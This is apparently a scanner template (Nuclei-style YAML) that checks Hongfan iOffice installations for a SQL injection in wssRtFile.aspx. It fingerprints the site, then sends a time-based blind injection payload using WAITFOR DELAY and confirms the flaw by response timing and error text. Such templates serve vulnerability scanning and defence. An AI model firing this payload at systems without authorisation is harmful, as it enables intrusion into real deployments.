id: poc-yaml-hongfan-ioffice-wssrtfile-sqli
info:
  name: 红帆iOffice wssRtFile SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection, iOffice

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

flow: |
  http(1) && http(2)

http:
  - id: check-ioffice
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "iOffice.net"

  - id: sqli-exploit
    method: GET
    path:
      - "{{BaseURL}}/iOffice/prg/set/wss/wssRtFile.aspx?Host=1%27;WAITFOR+DELAY+%270:0:{{t1}}%27--"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "下载文件"
          - "解密错误"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
